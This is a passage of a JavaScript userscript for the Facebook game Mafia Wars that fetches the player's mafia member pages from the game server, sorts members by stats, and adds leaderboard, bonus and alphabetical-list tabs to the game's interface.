            aTopMafiaDisplayTable[1][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            // Bodyguard
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for BodyGuard');
            strTemp = '';
            ibonus=0;
            itemp=0;

            for (i = 0; i<iMaxTopMafia ; i++) {
                itemp = g_Utils.getBodyguardBonus(aMafiaMembers[i][5]);
                if (ibonus != itemp) {
                    ibonus = itemp;
                    strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% bonus to defense</b></td></tr>';
                }
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            }

            aTopBonusDisplayTable[3].innerHTML = strTemp;
            aTopBonusDisplayTable[3].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            break;

        case 2:
            // by Successful Heists
            g_Utils.doLog('ProcessData', bDebugOn, 'Sorting by Successful Heists');

            g_Utils.MergeSort(6 , 0);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[2][0].innerHTML = strTemp;
            aTopMafiaDisplayTable[2][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            g_Utils.MergeSort(6 , 1);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[2][1].innerHTML = strTemp;
            aTopMafiaDisplayTable[2][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            // Safecracker
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for SafeCracker');
            strTemp = '';
            ibonus=0;
            itemp=0;

            for (i = 0; i<iMaxTopMafia ; i++) {
                itemp = g_Utils.getSafecrackerBonus(aMafiaMembers[i][6]);
                if (ibonus != itemp) {
                    ibonus = itemp;
                    strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% more money from fighting and robbing</b></td></tr>';
                }
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            }

            aTopBonusDisplayTable[4].innerHTML = strTemp;
            aTopBonusDisplayTable[4].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            break;

        case 3:
            // by Jobs Completed
            g_Utils.doLog('ProcessData', bDebugOn, 'Sorting by Jobs Completed');

            g_Utils.MergeSort(7 , 0);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[3][0].innerHTML = strTemp;
            aTopMafiaDisplayTable[3][0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            g_Utils.MergeSort(7 , 1);

            //Top Mafia
            strTemp = '';
            for (i = 0; i<iMaxTopMafia ; i++)
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            aTopMafiaDisplayTable[3][1].innerHTML = strTemp;
            aTopMafiaDisplayTable[3][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            // Mastermind
            g_Utils.doLog('ProcessData', bDebugOn, 'Looking for MasterMinds');
            strTemp = '';
            ibonus=0;
            itemp=0;

            for (i = 0; i<iMaxTopMafia ; i++) {
                itemp = g_Utils.getMastermindBonus(aMafiaMembers[i][7]);
                if (ibonus != itemp) {
                    ibonus = itemp;
                    strTemp = strTemp + '<tr bgcolor="green"><td><b>'+ibonus+'% more experience from jobs</b></td></tr>';
                }
                strTemp = strTemp + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + aMafiaMembers[i][0] + '</td></tr>';
            }

            aTopBonusDisplayTable[0].innerHTML = strTemp;
            aTopBonusDisplayTable[0].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            break;
        case 4:
            // Create Alphabetic lists
            if (iAlphaSortBy == 0) {
                g_Utils.doLog('ProcessData', bDebugOn, 'Sort Aphabetically by FB Name');
                g_Utils.MergeSort(1, 0);
            } else {
                g_Utils.doLog('ProcessData', bDebugOn, 'Sort Aphabetically by MW Name');
                g_Utils.MergeSort(2, 0);
            }

            for (var i = 0; i < 12; i++) {
                aTemp[i] = '';
            }

            for (var i = 0; i < aMafiaMembers.length; i++) {
                strHTML = aMafiaMembers[i][0];
                if (iAlphaSortBy == 0) {
                    strName = aMafiaMembers[i][1];
                } else {
                    strName = aMafiaMembers[i][2];
                }

                if (/^[a-zA-Z]/.test(strName)) {
                    if (/^[a-bA-B]/.test(strName))      aTemp[0]  = aTemp[0]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[c-dC-D]/.test(strName)) aTemp[1]  = aTemp[1]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[e-fE-F]/.test(strName)) aTemp[2]  = aTemp[2]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[g-hG-H]/.test(strName)) aTemp[3]  = aTemp[3]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[i-kI-K]/.test(strName)) aTemp[4]  = aTemp[4]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[l-nL-N]/.test(strName)) aTemp[5]  = aTemp[5]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[o-pO-P]/.test(strName)) aTemp[6]  = aTemp[6]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[q-rQ-R]/.test(strName)) aTemp[7]  = aTemp[7]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[s-tS-T]/.test(strName)) aTemp[8]  = aTemp[8]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[u-wU-W]/.test(strName)) aTemp[9]  = aTemp[9]  + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>'
                    else if (/^[x-zX-Z]/.test(strName)) aTemp[10] = aTemp[10] + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>';
                } else {
                    aTemp[11] = aTemp[11] + '<tr bgcolor="black" onmouseout="this.bgColor=\'black\';" onmouseover="this.bgColor=\'grey\';"><td>' + strHTML + '</td></tr>';
                }

            }

            for ( i = 0; i < 12; i++) {
                if (aTemp[i] == '')
                    aAlphaDisplayTable[i][0] = '<tr></tr>'
                else
                    aAlphaDisplayTable[i][0]= aTemp[i];
            }
            break;
        default:
            // Create DOM version
            j = iUpdate - 5 ;
            aAlphaDisplayTable[j][1].innerHTML = aAlphaDisplayTable[j][0];
            if (aAlphaDisplayTable[j][1].childNodes.length > 0)
                aAlphaDisplayTable[j][1].firstChild.setAttribute('style', 'border: 1px solid rgb(170, 170, 170); overflow: auto; height: 276px; width: 744px; float: left;');

            break;
    }

    if (iUpdate < 16) {
        iProcessEvent = setTimeout(function (e) {
            ProcessData(iUpdate + 1);
        },
        750)
        // Cancel the Timed Event if the user has left Mafia Wars
        if (iProcessEvent<iHoldEvent ) clearTimeout(iProcessEvent);
    } else {

        // save the tables if needed
        if (bSaveData) {
            iSaveTableEvent = setTimeout(function (e) {
                SaveAlphaTables(0);
            },
            g_Utils.getRandRange(1000, 1500));
            // Cancel the Timed Event if the user has left Mafia Wars
            if (iSaveTableEvent <iHoldEvent ) clearTimeout(iSaveTableEvent);
        } else {
            bDataBeingUpdated = false;
        }
    }
}


function getMafiaMembers() {

    var iPage = iPageCount;
    var iNextPage = iPage + 1;
    var iHoldEvent = iLoadEvent;
    var oDom;
    var iStart, iEnd, strTemp;
    var myurl;

    // exit the script is the user has disabled the auto update
    bAutoDisable = GM_getValue('bAutoDisable', false);
    bReLoad = GM_getValue('ForceReload',false);
    if ( bAutoDisable && !bReLoad ) {
        DisplayStatus('Cancelling Autoload.  Reloading Saved Data.');

        //reload saved data
        bDataBeingUpdated = true;
        bSaveData = false;
        iCount = 0;

        iLoadEvent = setTimeout(function (e) {
            LoadAlphaTables(0);
        },
        g_Utils.getRandRange(200, 300));

        return;
    }

    // Zero the data array if this is page 0
    if (iPage == 1 ) {
        aMafiaMembers.length = 0
    }

    // look for local_xw_sig

    local_xw_sig = unsafeWindow.local_xw_sig;

    // get FB user ID
    FB_user_id = GM_getValue('FB_user_id');

    if (typeof(FB_user_id) == 'undefined') {
        g_Utils.doLog('getMafiaMembers', bDebugOn, 'Face Book User ID has not been loaded.  Try Reloading the page');
        return;
    };

    // intialize WatchDog Timer.  If result have not been received in 30 seconds try again.
    iWatchDog = setTimeout(function (e) {
        xmlhttp.abort();
        g_Utils.doLog('getMafiaMembers', bDebugOn, 'Watchdog is killed the web request');

        iErrorCount = iErrorCount + 1;
        if (iErrorCount < 5) {
            g_Utils.doLog('getMafiaMembers', bDebugOn, 'Error reading page - Retrying');
            iLoadEvent = setTimeout(function (e) {
                getMafiaMembers();
            },
            g_Utils.getRandRange(500, 750));
            // Cancel the Timed Event if the user has left Mafia Wars
            if (iLoadEvent< iHoldEvent) clearTimeout(iLoadEvent);
        } else {
            // Done trying to load data.  Turn off autoupdates
            // Turn off the Auto Updates.  They are not working.
            GM_setValue('bAutoDisable', true);

            g_Utils.doLog('getMafiaMembers', bDebugOn, 'Done Reading pages - Too many error');

            // try reloading any saved data

            bSaveData = false;
            iCount = 0;

            iLoadEvent = setTimeout(function (e) {
                LoadAlphaTables(0);
            },
            g_Utils.getRandRange(200, 300));
        }
    },
    30000);

    myurl = 'http://facebook.mafiawars.com/mwfb/remote/html_server.php?xw_controller=group&xw_action=view&xw_city=1&p=' + iPage + '&xw_client_id=8';


    xmlhttp.open('POST',                             myurl, true);
    xmlhttp.setRequestHeader('Host',                 'facebook.mafiawars.com');

    xmlhttp.setRequestHeader('User-agent',           navigator.userAgent);

    xmlhttp.setRequestHeader('Accept-Language',      'en-us,en;q=0.5');
    xmlhttp.setRequestHeader('Accept',               '*/*');
    xmlhttp.setRequestHeader('Content-Type',         'application/x-www-form-urlencoded; charset=UTF-8');
    xmlhttp.setRequestHeader('Accept-Encoding',      'gzip,deflate');
    xmlhttp.setRequestHeader('Accept-Charset',       'ISO-8859-1,utf-8;q=0.7,*;q=0.7');
    xmlhttp.setRequestHeader('X-Requested-With',     'XMLHttpRequest');
    xmlhttp.onload = function(_responseDetails) {

        // kill the watchdog timer
        clearTimeout(iWatchDog );

        if (xmlhttp.status == 200) {
            var iPage = iPageCount;
            var iNextPage = iPage + 1;
            var iHoldEvent = iLoadEvent;
            var iMembersonPage = 0;
            var oDom, oTemp, oChild;
            var myHTML = xmlhttp.responseText;
            var tempDiv = document.createElement('div');

            // remove the script code for response
            var newHTML = myHTML.replace(/<script(.|\s)*?\/script>/g, '');

            //Stuff it into the DIV to get the DOM structure
            tempDiv.innerHTML = newHTML;

            //find all the mafia members
            oSnapshot = document.evaluate(strMyMafiaMembers, tempDiv, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);

            iMembersonPage = oSnapshot.snapshotLength;

            if (iMembersonPage>0) {
              // remove the Hired Guns if found
              if (oSnapshot.snapshotItem(iMembersonPage-1).childNodes.length == 7)
                 iMembersonPage = iMembersonPage - 1;
            }

            if ( iMembersonPage > 0) {
                g_Utils.doLog('getMafiaMembers', bDebugOn, 'Read Mafia Members Page ' + iPage);
                DisplayStatus('Read Mafia Members Page ' + iPage);

                for (iMembers = 0; iMembers < iMembersonPage ; iMembers++) {
                    oDom = document.createElement('div');
                    oDom.innerHTML = oSnapshot.snapshotItem(iMembers).innerHTML;
                     // skip the null entries.  MW opps.
                     if (oDom.childNodes.length > 0) {

                        // create array to store each members data
                        aMafiaMembers[iCount] = new Array();
                        // Inner HTML
                        aMafiaMembers[iCount][0]    = oDom.innerHTML
                        aMafiaMembers[iCount][1]    = g_Utils.getMafiaMemberFBName(oDom);
                        aMafiaMembers[iCount][2]    = g_Utils.getMafiaMemberMWName(oDom);
                        aMafiaMembers[iCount][3]    = g_Utils.getMafiaMemberType(oDom);
                        aMafiaMembers[iCount][4]    = g_Utils.getMafiaMemberLevel(oDom);
                        aMafiaMembers[iCount][5]    = g_Utils.getMafiaMemberFightswon(oDom);
                        aMafiaMembers[iCount][6]    = g_Utils.getMafiaMemberSussfulheists(oDom);
                        aMafiaMembers[iCount][7]    = g_Utils.getMafiaMemberjobscompleted(oDom);
                        iCount = iCount + 1;
                    }
                }

                //load the next page
                iPageCount = iNextPage;
                iErrorCount = 0;
                iLoadEvent = setTimeout(function (e) {
                    getMafiaMembers();
                },
                g_Utils.getRandRange(500, 750));
                // Cancel the Timed Event if the user has left Mafia Wars
                if (iLoadEvent < iHoldEvent) clearTimeout(iLoadEvent);
            } else {
                iErrorCount = iErrorCount + 1;
                if (iErrorCount <= 2) {
                    g_Utils.doLog('getMafiaMembers', bDebugOn, 'Checking to make sure done reading memebers');
                    iLoadEvent = setTimeout(function (e) {
                        getMafiaMembers();
                    },
                    g_Utils.getRandRange(500, 750));
                    // Cancel the Timed Event if the user has left Mafia Wars
                    if (iLoadEvent < iHoldEvent) clearTimeout(iLoadEvent);
                } else {
                    g_Utils.doLog('getMafiaMembers', bDebugOn, 'Done Reading pages - Have Reached the end');

                    iProcessEvent = setTimeout(function (e) {
                        ProcessData(0);
                    },
                    g_Utils.getRandRange(500, 750));
                }
            }
        } else {
            iErrorCount = iErrorCount + 1;
            if (iErrorCount < 5) {
                g_Utils.doLog('getMafiaMembers', bDebugOn, 'Error reading page - Retrying');
                iLoadEvent = setTimeout(function (e) {
                    getMafiaMembers();
                },
                g_Utils.getRandRange(500, 750));
                // Cancel the Timed Event if the user has left Mafia Wars
                if (iLoadEvent< iHoldEvent) clearTimeout(iLoadEvent);
            } else {
                // Done trying to load data.  Turn off autoupdates
                // Turn off the Auto Updates.  They are not working.
                GM_setValue('bAutoDisable', true);

                g_Utils.doLog('getMafiaMembers', bDebugOn, 'Done Reading pages - Too many error');

                // try reloading any saved data

                bSaveData = false;
                iCount = 0;

                iLoadEvent = setTimeout(function (e) {
                    LoadAlphaTables(0);
                },
                g_Utils.getRandRange(200, 300));
            }
        }
    }
    xmlhttp.send('ajax=1&liteload=1&sf_xw_user_id=' + FB_user_id + '&sf_xw_sig=' + local_xw_sig );
}

function DisplaySettings()
{
    var oDom, oButton, test;

    test = GM_getValue('bAutoDisable');
    oDom = document.getElementById(strStatus);
    if (oDom != null) {
        if (!test) {
            oDom.childNodes[2].innerHTML = '<b>On</b>';
            oDom.childNodes[4].innerHTML = 'Off';
        } else {
            oDom.childNodes[2].innerHTML = 'On';
            oDom.childNodes[4].innerHTML = '<b>Off</b>';
        }
    }

    test = GM_getValue('iAlphaSortBy');
    oDom = document.getElementById(strSortBy);
    if (oDom != null) {
        if (test == 0) {
            oDom.childNodes[2].innerHTML = '<b>FaceBook</b>';
            oDom.childNodes[4].innerHTML = 'MafiaWar';
        } else {
            oDom.childNodes[2].innerHTML = 'FaceBook';
            oDom.childNodes[4].innerHTML = '<b>MafiaWar</b>';
        }
    }

}

function DisplayStatus(_job) {

    var oDom, oButton, test;

    oDom = document.getElementById(strCurrentJob);
    if (oDom!=null) {
        if (typeof(_job)=='undefined') {
            oDom.innerHTML = '<b>Status</b> : idle';
        } else {
            oDom.innerHTML = '<b>Status</b> : '+_job;
        }
     }

}

function FixMafiaMenu() {

    var oUl, oA, oDiv, oLi, oDiv, oDom, oTabItem, oButtton, oSnapShot;
    var strTemp;

	// get the city code
	strCityCode = g_Utils.getSnapshot(strCityWrapper).snapshotItem(0).getAttribute('class');;
	
	// find the "Free Gifts Button"
	oSnapShot = g_Utils.getSnapshot(strFreeGifts);
	
		if (oSnapShot.snapshotLength>0) {
		
		oA = oSnapShot.snapshotItem(0);
		
		// Mark the whole toolbar for later use
		oUl = oA.parentNode.parentNode.parentNode;
		oUl.id = strTopFamilyToolbar;
		
		if ((strCityCode == 'mw_city5') || (strCityCode == 'mw_city6')|| (strCityCode == 'mw_city7')){
			// LV and IT only
			// fix up the widths
			for (var i=0; i<oUl.childNodes.length; i +=3) {
				oDiv = oUl.childNodes[i].childNodes[0]
				oDiv.setAttribute('style','width:80px');
				//oDiv.innerHTML = oDiv.innerHTML.replace(/Grow your Mafia/, "Grow Mafia"); 
			}
			
			// Get the list Element for "My Madfia" button
			oLi = oUl.childNodes[3];
			strTemp = oLi.getAttribute('class');
			
			// add a new spacer
			if (strTemp.indexOf('tab_on')<0) {
				oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_off')
			} else {
				oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_on')
				oUl.childNodes[4].setAttribute('class','spacer_right_off');
			}
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			oTabItem = g_DOMUtils.newElem('li', '', 'spacer_left_off')
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// add Button
			oTabItem = g_DOMUtils.newElem('li', '', 'tab_off');
			oDiv = g_DOMUtils.newElem('div', '', 'tab_content', 'width: 80px');
			oButton = g_DOMUtils.newElem('a', 'LeaderBoard');
			g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Leader Board'));
			oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardDisplay, false);
			oDiv.appendChild(oButton);
			oTabItem.appendChild(oDiv);
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// Add Top Mafia Button;
			
			// add a new spacer
			oTabItem = g_DOMUtils.newElem('li', '', 'spacer_right_off')
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			oTabItem = g_DOMUtils.newElem('li', '', 'spacer_left_off')
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// add button        
			oTabItem = g_DOMUtils.newElem('li', '', 'tab_off');
			oDiv = g_DOMUtils.newElem('div', '', 'tab_content', 'width: 80px');
			oButton = g_DOMUtils.newElem('a', 'Top Mafia');
			g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Top Mafia'));
			oButton.addEventListener("click", g_ListenerLib.click_TopMafiaDisplay, false);
			oDiv.appendChild(oButton);
			oTabItem.appendChild(oDiv);
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
		
		} else {    
			// All other cities     
			// fix up the widths
			for (var i=0; i<oUl.childNodes.length; i +=2) {
				oDiv = oUl.childNodes[i].childNodes[0]
				oDiv.setAttribute('style','width:80px');
				oDiv.innerHTML = oDiv.innerHTML.replace(/Grow your Mafia/, "Grow Mafia"); 
			}
			
			// Get the list Element for "My Madfia" button
			oLi = oUl.childNodes[2];
			strTemp = oLi.getAttribute('class');
			
			// add a new spacer
			if (strTemp.indexOf('tab_on')<0) {
				oTabItem = g_DOMUtils.newElem('li', '', 'black_black_cap')
			} else {
				oTabItem = g_DOMUtils.newElem('li', '', 'red_black_cap');
				oUl.childNodes[3].setAttribute('class','black_black_cap');
			}
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// add Button
			oTabItem = g_DOMUtils.newElem('li', '', 'tab_off');
			oDiv = g_DOMUtils.newElem('div', '', 'tab_content', 'width: 80px');
			oButton = g_DOMUtils.newElem('a', 'LeaderBoard');
			g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Leader Board'));
			oButton.addEventListener("click", g_ListenerLib.click_LeaderBoardDisplay, false);
			oDiv.appendChild(oButton);
			oTabItem.appendChild(oDiv);
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// Add Top Mafia Button;
			
			// add a new spacer
			oTabItem = g_DOMUtils.newElem('li', '', 'black_black_cap')
			oTabItem.innerHTML = '<img src="http://mwfb.static.zynga.com/mwfb/graphics/spacer.gif"/>';
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
			oLi = oTabItem;
			
			// add button        
			oTabItem = g_DOMUtils.newElem('li', '', 'tab_off');
			oDiv = g_DOMUtils.newElem('div', '', 'tab_content', 'width: 80px');
			oButton = g_DOMUtils.newElem('a', 'Top Mafia');
			g_DOMUtils.doAppend(oButton, g_DOMUtils.newText('Top Mafia'));
			oButton.addEventListener("click", g_ListenerLib.click_TopMafiaDisplay, false);
			oDiv.appendChild(oButton);
			oTabItem.appendChild(oDiv);
			oLi.parentNode.insertBefore(oTabItem, oLi.nextSibling);
		
		}
	
	}
}

function CreateStatusLine(_iOption) {
    var oDiv,oTbody,oTr,oTd,oImg,oButton;
    
    //Add Status Line
    oDiv   = document.createElement('div');

    oTbody = document.createElement('tbody');
    oTbody.setAttribute('style', 'border: 0px; height: 60px; width: 732px; float: left;');
    oDiv.appendChild(oTbody);

    oTr = document.createElement('tr');
    oTbody.appendChild(oTr);

    oTd  = document.createElement('td');
    oTd.setAttribute('style', 'width: 60px;');
    oTd.setAttribute('rowspan', '2');
    oButton = document.createElement('a');
    oButton.setAttribute('href','http://userscripts.org/scripts/show/62860');
    oButton.setAttribute('target','_blank');
    oImg = document.createElement('img');
    oImg.setAttribute('src',imgABC);
    oButton.appendChild(oImg);
    oTd.appendChild(oButton);
    oTr.appendChild(oTd);

    oTd = document.createElement('td');
    oTd.id = strStatus ;
    oTd.innerHTML = '<b>Auto Update</b> : <a><b>On</b></a> / <a>Off</a>';
    oTd.childNodes[2].addEventListener("click", g_ListenerLib.click_Auto(0), false);
    oTd.childNodes[4].addEventListener("click", g_ListenerLib.click_Auto(1), false);
    oTd.setAttribute('style', 'width: 220px;');
    oTr.appendChild(oTd);

    oTd = document.createElement('td');
    oTd.setAttribute('style', 'width: 220px;');
    oTd.innerHTML = '<b>Manual Update</b> : <a>Update</a>';
    oTd.childNodes[2].addEventListener("click", g_ListenerLib.click_ReLoad, false);
    oTr.appendChild(oTd);
        
    if (_iOption == 1) {
        oTd = document.createElement('td');
        oTd.id = strSortBy ;
        oTd.innerHTML = '<b>Sort by</b> : <a><b>FaceBook</b></a> / <a>MafiaWar</a>';
        oTd.childNodes[2].addEventListener("click", g_ListenerLib.click_Sort(0), false);
        oTd.childNodes[4].addEventListener("click", g_ListenerLib.click_Sort(1), false);
        oTr.appendChild(oTd);
    }
    
    oTr = document.createElement('tr');
    oTbody.appendChild(oTr);

    oTd = document.createElement('td');
    oTd.id = strCurrentJob;
    oTd.innerHTML = '<b>Status</b> : idle';
    oTd.setAttribute('colspan', '3');
    oTr.appendChild(oTd);   
    
    return oDiv;
}

function CreateAlphaDisplay() {

    var i, oDom, ODiv, oTbody, oTr, oTd, Snapshot, oTemp, oTemp1, oTemp2;

    // are we still on the My Mafia Page and have not been here
    oSnapshot = g_Utils.getSnapshot(strMyMafia);

    oTemp  = document.getElementById(strAlphaToolbar+'Header');
    oTemp1 = document.getElementById(strAlphaToolbar+'Div1');
    oTemp2 = document.getElementById(strAlphaToolbar+'Div2');

    if (oSnapshot.snapshotLength && (oTemp != null)) {
        if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')|| (strCityCode == 'mw_city7')) {
	        oTemp.setAttribute('style',"height:47px; width:740px; overflow:hidden; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/nav_container.gif') no-repeat scroll 0 0 transparent")
            oTemp1.setAttribute('style','display:none');
            oTemp2.setAttribute('style','display:blocked');
        } else {
	        oTemp.setAttribute('style',"height:47px; width:740px; overflow:hidden;")
            oTemp1.setAttribute('style','display:blocked');
            oTemp2.setAttribute('style','display:none');
        }
    } else if (oSnapshot.snapshotLength && (oTemp == null)) {
        GM_log('did not find toolbar');

        // find the Page line if it exists
        oTemp = g_Utils.getSnapshot(strMyMafiaPage);
        if (oTemp.snapshotLength>0) {
            // get the location of the Page line
            oDom = oTemp.snapshotItem(0);
        } else {
            oTemp = g_Utils.getSnapshot(strMyMafiaBox);

            oDiv = oTemp.snapshotItem(0);

            // create the page Div if it does not exist
            oDom   = document.createElement('div');


            oDiv.parentNode.insertBefore(oDom, oDiv.nextSibling);
        }

        //Add Status Line
        oDiv   = CreateStatusLine(1)
        oDom.parentNode.insertBefore(oDiv, oDom);

        //replace the page line
        g_Utils.doLog('CreateAlphaDisplay', bDebugOn, 'Replace the Page Bar');

        oDom.innerHTML = '';
        oDom.setAttribute('style','float: left;');
       
        oTemp1 = document.createElement('div');
        oTemp1.id = strAlphaToolbar+'Header';
        if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')|| (strCityCode == 'mw_city7')) {
	        oTemp1.setAttribute('style',"height:47px; width:740px; overflow:hidden; background:url('http://mwfb.static.zynga.com/mwfb/graphics/map_based_jobs/expert_view/nav_container.gif') no-repeat scroll 0 0 transparent")
        } else {
	        oTemp1.setAttribute('style',"height:47px; width:740px; overflow:hidden; ")
        }
        
        // spacer div
        oDiv = document.createElement('div');
        oDiv.setAttribute('class', 'tab_control_empty');
        oDiv.setAttribute('style', 'width: 3px;');
        oDiv.innerHTML = '<div></div>'
        oTemp1.appendChild(oDiv);
        GM_log('spacer created');
        
        if ((strCityCode == 'mw_city5')||(strCityCode == 'mw_city6')||(strCityCode == 'mw_city7')) {
	        oDiv = document.createElement('div');
	        oDiv.id = strAlphaToolbar+'Div1'
	        oDiv.setAttribute('style','display:none');
	        
            createToolBar(oDiv, 12, strAlphaToolbar+'1', 'AB CD EF GH IJK LMN OP QR ST UVW XYZ *','Other');
            
            oTemp1.appendChild(oDiv);

   	        oDiv = document.createElement('div');
	        oDiv.id = strAlphaToolbar+'Div2'
	        oDiv.setAttribute('style','display:blocked');
	        
	        // spacer div
	        oTemp2 = document.createElement('div');
	        oTemp2.setAttribute('class', 'tab_control_empty');
	        oTemp2.setAttribute('style', 'width: 3px;');
	        oTemp2.innerHTML = '<div></div>'
	        oDiv.appendChild(oTemp2);
	                                
            createToolBar(oDiv, 12, strAlphaToolbar+'2', 'AB CD EF GH IJK LMN OP QR ST UVW XYZ *','LV');
            
            // spacer div
	        oTemp2 = document.createElement('div');
	        oTemp2.setAttribute('class', 'tab_control_empty');
	        oTemp2.setAttribute('style', 'width: 3px;');
	        oTemp2.innerHTML = '<div></div>'
	        oDiv.appendChild(oTemp2);
	
	        oTemp1.appendChild(oDiv);
            
        } else {
            oDiv = document.createElement('div');
	        oDiv.id = strAlphaToolbar+'Div1'
	        oDiv.setAttribute('style','display:blocked');
	        
            createToolBar(oDiv, 12, strAlphaToolbar+'1', 'AB CD EF GH IJK LMN OP QR ST UVW XYZ *','Other');
            
            oTemp1.appendChild(oDiv);

   	        oDiv = document.createElement('div');
	        oDiv.id = strAlphaToolbar+'Div2'
	        oDiv.setAttribute('style','display:none');
	        
	        // spacer div
	        oTemp2 = document.createElement('div');
	        oTemp2.setAttribute('class', 'tab_control_empty');
	        oTemp2.setAttribute('style', 'width: 3px;');
	        oTemp2.innerHTML = '<div></div>'
	        oDiv.appendChild(oTemp2);
	                                
            createToolBar(oDiv, 12, strAlphaToolbar+'2', 'AB CD EF GH IJK LMN OP QR ST UVW XYZ *','LV');
            
            // spacer div
	        oTemp2 = document.createElement('div');
	        oTemp2.setAttribute('class', 'tab_control_empty');
	        oTemp2.setAttribute('style', 'width: 3px;');
	        oTemp2.innerHTML = '<div></div>'
	        oDiv.appendChild(oTemp2);
	
	        oTemp1.appendChild(oDiv);
